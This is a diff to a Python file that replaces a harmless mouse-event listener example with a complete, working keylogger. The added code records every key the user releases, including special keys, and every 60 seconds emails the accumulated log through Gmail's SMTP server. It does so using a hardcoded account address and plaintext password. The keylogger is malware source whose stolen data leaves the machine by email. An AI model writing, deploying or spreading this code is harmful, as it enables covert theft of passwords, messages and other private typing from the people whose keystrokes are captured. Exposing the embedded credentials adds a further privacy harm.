@@ -1,34 +1,77 @@
-from pynput import mouse
+import keyboard
+import smtplib
+from threading import Semaphore, Timer
 
-def on_move(x, y):
-    print('Pointer moved to {0}'.format(
-        (x, y)))
+SEND_REPORT_EVERY = 60  # 1 minutes
+EMAIL_ADDRESS = "keyloggertest663@gmail.com"
+EMAIL_PASSWORD = "Qs@q&Qj2jUhX3gd0VqM#"
 
-def on_click(x, y, button, pressed):
-    print('{0} at {1}'.format(
-        'Pressed' if pressed else 'Released',
-        (x, y)))
-    if not pressed:
-        # Stop listener
-        return False
+class Keylogger:
+    def __init__(self, interval):
+        # we gonna pass SEND_REPORT_EVERY to interval
+        self.interval = interval
+        # this is the string variable that contains the log of all 
+        # the keystrokes within `self.interval`
+        self.log = ""
+        # for blocking after setting the on_release listener
+        self.semaphore = Semaphore(0)
 
-def on_scroll(x, y, dx, dy):
-    print('Scrolled {0} at {1}'.format(
-        'down' if dy < 0 else 'up',
-        (x, y)))
+    def callback(self, event):
+        """This callback is invoked whenever a keyboard event is occured
+        (i.e when a key is released in this example)"""
+        name = event.name
+        if len(name) > 1:
+            # not a character, special key (e.g ctrl, alt, etc.)
+            # uppercase with []
+            if name == "space":
+                # " " instead of "space"
+                name = " "
+            elif name == "enter":
+                # add a new line whenever an ENTER is pressed
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                # replace spaces with underscores
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        self.log += name
 
-# Collect events until released
-with mouse.Listener(
-        on_move=on_move,
-        on_click=on_click,
-        on_scroll=on_scroll) as listener:
-    listener.join()
+    def sendmail(self, email, password, message):
+        # manages a connection to the SMTP server
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        # connect to the SMTP server as TLS mode ( for security )
+        server.starttls()
+        # login to the email account
+        server.login(email, password)
+        # send the actual message
+        server.sendmail(email, email, message)
+        # terminates the session
+        server.quit()
 
-# ...or, in a non-blocking fashion:
-listener = mouse.Listener(
-    on_move=on_move,
-    on_click=on_click,
-    on_scroll=on_scroll)
-    
-listener.start()
+    def report(self):
+        """
+        This function gets called every `self.interval`
+        It basically sends keylogs and resets `self.log` variable
+        """
+        if self.log:
+            # if there is something in log, report it
+            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+            # print(self.log)
+        self.log = ""
+        Timer(interval=self.interval, function=self.report).start()
 
+    def start(self):
+        # start the keylogger
+        keyboard.on_release(callback=self.callback)
+        # start reporting the keylogs
+        self.report()
+        # block the current thread,
+        # since on_release() doesn't block the current thread
+        # if we don't block it, when we execute the program, nothing will happen
+        # that is because on_release() will start the listener in a separate thread
+        self.semaphore.acquire()
+
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
+    keylogger.start()
